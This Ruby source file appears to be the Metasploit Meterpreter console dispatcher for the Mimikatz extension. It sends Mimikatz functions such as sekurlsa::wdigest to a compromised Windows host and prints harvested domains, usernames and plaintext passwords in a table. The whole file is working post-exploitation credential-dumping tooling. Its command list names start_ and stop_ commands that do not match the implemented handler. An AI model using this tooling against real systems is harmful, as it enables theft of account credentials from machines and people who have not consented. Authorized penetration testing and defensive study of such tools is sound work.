# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Mimikatz extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by Ben Campbell (Meatballs)
###
class Console::CommandDispatcher::Mimikatz

  Klass = Console::CommandDispatcher::Mimikatz

  include Console::CommandDispatcher

  #
  # Initializes an instance of the priv command interaction.
  #
  def initialize(shell)
    super
    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
      print_line
      print_warning "Loaded x86 Mimikatz on an x64 architecture."
    end
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "start_mimikatz_command" => "Run a custom command",
      "stop_mimikatz_command" => "Run a custom command",
    }
  end

  @@command_opts = Rex::Parser::Arguments.new(
    "-f" => [true, "The function to pass to the command."],
    "-a" => [true, "The arguments to pass to the command."],
    "-h" => [false, "Help menu."]
  )

  def cmd_mimikatz_command(*args)
    if (args.length == 0)
      args.unshift("-h")
    end

    cmd_args = nil
    cmd_func = nil
    arguments = []

    @@command_opts.parse(args) { |opt, idx, val|
      case opt
        when "-a"
          cmd_args = val
        when "-f"
          cmd_func = val
        when "-h"
          print(
            "Usage: mimikatz_command -f func -a args\n\n" +
            "Executes a mimikatz command on the remote machine.\n" +
            "e.g. mimikatz_command -f sekurlsa::wdigest -a \"full\"\n" +
            @@command_opts.usage)
          return true
      end
    }

    unless cmd_func
      print_error("You must specify a function with -f")
      return true
    end

    if cmd_args
      arguments = cmd_args.split(" ")
    end

    print_line client.mimikatz.send_custom_command(cmd_func, arguments)
  end

  def mimikatz_request(provider, method)
    print_status("Retrieving #{provider} credentials")
    accounts = method.call

    table = Rex::Ui::Text::Table.new(
      'Header' => "#{provider} credentials",
      'Indent' => 0,
      'SortIndex' => 4,
      'Columns' =>
      [
        'AuthID', 'Package', 'Domain', 'User', 'Password'
      ]
    )

    accounts.each do |acc|
      table << [acc[:authid], acc[:package], acc[:domain], acc[:user], (acc[:password] || "").gsub("\n","")]
    end

    print_line table.to_s

    return true
  end

  #
  # Name for this dispatcher
  #
  def name
    "Mimikatz"
  end
end

end
end
end
end

